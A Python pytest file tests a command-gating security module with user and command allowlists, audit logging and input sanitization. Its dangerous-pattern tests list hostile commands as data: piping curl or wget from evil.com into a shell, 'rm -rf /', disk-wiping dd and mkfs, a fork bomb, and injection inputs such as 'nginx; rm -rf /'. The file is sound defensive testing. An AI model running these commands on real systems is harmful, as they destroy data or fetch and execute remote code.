"""Tests for security module."""

import json
from pathlib import Path

import pytest

from src.security import DANGEROUS_PATTERNS, SecurityGuard


class TestSecurityGuard:
    """Tests for SecurityGuard class."""

    @pytest.fixture
    def tmp_allowlist(self, tmp_path: Path) -> Path:
        """Create temporary allowlist file."""
        allowlist_path = tmp_path / "allowlist.json"
        allowlist_path.write_text(
            json.dumps(
                {
                    "commands": {
                        "system": [
                            "systemctl status",
                            "systemctl restart",
                            "journalctl -u",
                            "df -h",
                            "free -m",
                        ],
                        "docker": ["docker ps", "docker logs"],
                    },
                    "blocked_patterns": ["rm -rf /", "mkfs"],
                }
            )
        )
        return allowlist_path

    @pytest.fixture
    def tmp_audit_log(self, tmp_path: Path) -> Path:
        """Create temporary audit log path."""
        return tmp_path / "audit.log"

    @pytest.fixture
    def guard(self, tmp_allowlist: Path, tmp_audit_log: Path) -> SecurityGuard:
        """Create SecurityGuard with test configuration."""
        return SecurityGuard(
            allowed_user_ids=[123456789, 987654321],
            allowlist_path=tmp_allowlist,
            audit_log_path=tmp_audit_log,
        )


class TestUserAuthorization(TestSecurityGuard):
    """Tests for user authorization."""

    def test_allowed_user_passes(self, guard: SecurityGuard) -> None:
        """Authorized user should be allowed."""
        assert guard.is_user_allowed(123456789) is True

    def test_second_allowed_user_passes(self, guard: SecurityGuard) -> None:
        """Second authorized user should also be allowed."""
        assert guard.is_user_allowed(987654321) is True

    def test_unknown_user_blocked(self, guard: SecurityGuard) -> None:
        """Unknown user should be blocked."""
        assert guard.is_user_allowed(999999999) is False

    def test_zero_user_id_blocked(self, guard: SecurityGuard) -> None:
        """Zero user ID should be blocked."""
        assert guard.is_user_allowed(0) is False

    def test_negative_user_id_blocked(self, guard: SecurityGuard) -> None:
        """Negative user ID should be blocked."""
        assert guard.is_user_allowed(-1) is False


class TestCommandAllowlist(TestSecurityGuard):
    """Tests for command allowlist validation."""

    def test_safe_command_allowed(self, guard: SecurityGuard) -> None:
        """Allowed command should pass."""
        assert guard.is_command_allowed("systemctl status nginx") is True

    def test_systemctl_restart_allowed(self, guard: SecurityGuard) -> None:
        """systemctl restart should be allowed."""
        assert guard.is_command_allowed("systemctl restart nginx") is True

    def test_docker_ps_allowed(self, guard: SecurityGuard) -> None:
        """docker ps should be allowed."""
        assert guard.is_command_allowed("docker ps") is True

    def test_docker_logs_allowed(self, guard: SecurityGuard) -> None:
        """docker logs should be allowed."""
        assert guard.is_command_allowed("docker logs mycontainer") is True

    def test_unknown_command_blocked(self, guard: SecurityGuard) -> None:
        """Unknown command should be blocked."""
        assert guard.is_command_allowed("wget evil.com") is False

    def test_partial_match_not_allowed(self, guard: SecurityGuard) -> None:
        """Partial command match should not be allowed."""
        assert guard.is_command_allowed("systemctl-fake status") is False

    def test_dangerous_command_blocked(self, guard: SecurityGuard) -> None:
        """Dangerous command should be blocked even if it starts with allowed prefix."""
        # This command starts with 'systemctl' but contains dangerous pattern
        assert guard.is_command_allowed("rm -rf /") is False


class TestDangerousPatterns(TestSecurityGuard):
    """Tests for dangerous pattern detection."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "rm -rf /",
            "rm -rf /*",
            "mkfs.ext4 /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "curl http://evil.com | bash",
            "wget http://evil.com | sh",
            "chmod -R 777 /",
            "echo 'test' | sh",
            "cat file | bash",
            "sudo su",
            "sudo su -",
            "passwd root",
        ],
    )
    def test_dangerous_patterns_detected(self, guard: SecurityGuard, cmd: str) -> None:
        """Dangerous commands should be detected."""
        warnings = guard.check_dangerous_patterns(cmd)
        assert len(warnings) > 0, f"Should detect danger in: {cmd}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "systemctl status nginx",
            "docker ps",
            "df -h",
            "free -m",
            "journalctl -u nginx -n 100",
            "ls -la /var/log",
        ],
    )
    def test_safe_patterns_pass(self, guard: SecurityGuard, cmd: str) -> None:
        """Safe commands should not trigger warnings."""
        warnings = guard.check_dangerous_patterns(cmd)
        assert len(warnings) == 0, f"Should not detect danger in: {cmd}"

    def test_case_insensitive_detection(self, guard: SecurityGuard) -> None:
        """Pattern detection should be case insensitive."""
        warnings = guard.check_dangerous_patterns("RM -RF /")
        assert len(warnings) > 0

    def test_fork_bomb_detected(self, guard: SecurityGuard) -> None:
        """Fork bomb pattern should be detected."""
        warnings = guard.check_dangerous_patterns(":(){:|:&};:")
        assert len(warnings) > 0


class TestInputSanitization(TestSecurityGuard):
    """Tests for input sanitization."""

    def test_removes_semicolon(self, guard: SecurityGuard) -> None:
        """Semicolon should be removed."""
        result = guard.sanitize_input("nginx; rm -rf /")
        assert ";" not in result

    def test_removes_backticks(self, guard: SecurityGuard) -> None:
        """Backticks should be removed."""
        result = guard.sanitize_input("echo `whoami`")
        assert "`" not in result

    def test_removes_dollar_sign(self, guard: SecurityGuard) -> None:
        """Dollar sign should be removed."""
        result = guard.sanitize_input("echo $HOME")
        assert "$" not in result

    def test_removes_pipe(self, guard: SecurityGuard) -> None:
        """Pipe should be removed."""
        result = guard.sanitize_input("cat /etc/passwd | grep root")
        assert "|" not in result

    def test_removes_ampersand(self, guard: SecurityGuard) -> None:
        """Ampersand should be removed."""
        result = guard.sanitize_input("sleep 100 &")
        assert "&" not in result

    def test_removes_newlines(self, guard: SecurityGuard) -> None:
        """Newlines should be removed."""
        result = guard.sanitize_input("cmd1\ncmd2")
        assert "\n" not in result

    def test_collapses_whitespace(self, guard: SecurityGuard) -> None:
        """Multiple spaces should collapse to single space."""
        result = guard.sanitize_input("cmd    with    spaces")
        assert "    " not in result
        assert result == "cmd with spaces"

    def test_strips_result(self, guard: SecurityGuard) -> None:
        """Result should be stripped."""
        result = guard.sanitize_input("  cmd  ")
        assert result == "cmd"

    def test_preserves_safe_content(self, guard: SecurityGuard) -> None:
        """Safe content should be preserved."""
        result = guard.sanitize_input("systemctl status nginx")
        assert result == "systemctl status nginx"


class TestAuditLog(TestSecurityGuard):
    """Tests for audit logging."""

    def test_audit_log_creates_file(
        self, guard: SecurityGuard, tmp_audit_log: Path
    ) -> None:
        """Audit log should create file."""
        guard.audit_log(123, "test_action", "test details")
        assert tmp_audit_log.exists()

    def test_audit_log_writes_json(
        self, guard: SecurityGuard, tmp_audit_log: Path
    ) -> None:
        """Audit log should write valid JSON."""
        guard.audit_log(123, "command", "systemctl status nginx")

        content = tmp_audit_log.read_text().strip()
        entry = json.loads(content)

        assert entry["user_id"] == 123
        assert entry["action"] == "command"
        assert entry["details"] == "systemctl status nginx"
        assert entry["allowed"] is True

    def test_audit_log_records_blocked(
        self, guard: SecurityGuard, tmp_audit_log: Path
    ) -> None:
        """Audit log should record blocked actions."""
        guard.audit_log(
            user_id=999,
            action="command",
            details="rm -rf /",
            allowed=False,
            warnings=["Dangerous pattern detected"],
        )

        content = tmp_audit_log.read_text().strip()
        entry = json.loads(content)

        assert entry["allowed"] is False
        assert "Dangerous pattern detected" in entry["warnings"]

    def test_audit_log_appends(self, guard: SecurityGuard, tmp_audit_log: Path) -> None:
        """Audit log should append entries."""
        guard.audit_log(123, "action1", "details1")
        guard.audit_log(456, "action2", "details2")

        lines = tmp_audit_log.read_text().strip().split("\n")
        assert len(lines) == 2

    def test_audit_log_includes_timestamp(
        self, guard: SecurityGuard, tmp_audit_log: Path
    ) -> None:
        """Audit log entries should include timestamp."""
        guard.audit_log(123, "test", "details")

        content = tmp_audit_log.read_text().strip()
        entry = json.loads(content)

        assert "timestamp" in entry
        assert "T" in entry["timestamp"]  # ISO format


class TestValidateCommand(TestSecurityGuard):
    """Tests for comprehensive command validation."""

    def test_valid_command_by_authorized_user(self, guard: SecurityGuard) -> None:
        """Valid command by authorized user should be allowed."""
        allowed, warnings = guard.validate_command(123456789, "systemctl status nginx")
        assert allowed is True
        assert len(warnings) == 0

    def test_unauthorized_user_blocked(self, guard: SecurityGuard) -> None:
        """Unauthorized user should be blocked."""
        allowed, warnings = guard.validate_command(999999999, "systemctl status nginx")
        assert allowed is False
        assert "User not authorized" in warnings

    def test_dangerous_command_blocked(self, guard: SecurityGuard) -> None:
        """Dangerous command should be blocked."""
        allowed, warnings = guard.validate_command(123456789, "rm -rf /")
        assert allowed is False
        assert any("Dangerous" in w or "dangerous" in w for w in warnings)

    def test_unknown_command_blocked(self, guard: SecurityGuard) -> None:
        """Unknown command should be blocked."""
        allowed, warnings = guard.validate_command(123456789, "unknown_command --flag")
        assert allowed is False
        assert "Command not in allowlist" in warnings

    def test_validation_logs_to_audit(
        self, guard: SecurityGuard, tmp_audit_log: Path
    ) -> None:
        """Validation should write to audit log."""
        guard.validate_command(123456789, "systemctl status nginx")

        assert tmp_audit_log.exists()
        content = tmp_audit_log.read_text()
        assert "systemctl status nginx" in content


class TestGetAllowedCommands(TestSecurityGuard):
    """Tests for getting allowed commands."""

    def test_returns_categories(self, guard: SecurityGuard) -> None:
        """Should return command categories."""
        commands = guard.get_allowed_commands()
        assert "system" in commands
        assert "docker" in commands

    def test_returns_correct_commands(self, guard: SecurityGuard) -> None:
        """Should return correct commands per category."""
        commands = guard.get_allowed_commands()
        assert "systemctl status" in commands["system"]
        assert "docker ps" in commands["docker"]


class TestReloadAllowlist(TestSecurityGuard):
    """Tests for allowlist reloading."""

    def test_reload_picks_up_changes(
        self, guard: SecurityGuard, tmp_allowlist: Path
    ) -> None:
        """Reloading should pick up file changes."""
        # Initially docker ps is allowed
        assert guard.is_command_allowed("docker ps") is True

        # Modify allowlist to remove docker commands
        new_allowlist = {
            "commands": {"system": ["systemctl status"]},
            "blocked_patterns": [],
        }
        tmp_allowlist.write_text(json.dumps(new_allowlist))

        # Reload
        guard.reload_allowlist()

        # docker ps should now be blocked
        assert guard.is_command_allowed("docker ps") is False


class TestDangerousPatternsCompleteness:
    """Tests for dangerous patterns list completeness."""

    def test_patterns_have_descriptions(self) -> None:
        """All dangerous patterns should have descriptions."""
        for pattern, description in DANGEROUS_PATTERNS:
            assert len(description) > 0, f"Pattern {pattern} missing description"

    def test_patterns_are_valid_regex(self) -> None:
        """All dangerous patterns should be valid regex."""
        import re

        for pattern, _ in DANGEROUS_PATTERNS:
            # Should not raise
            re.compile(pattern)
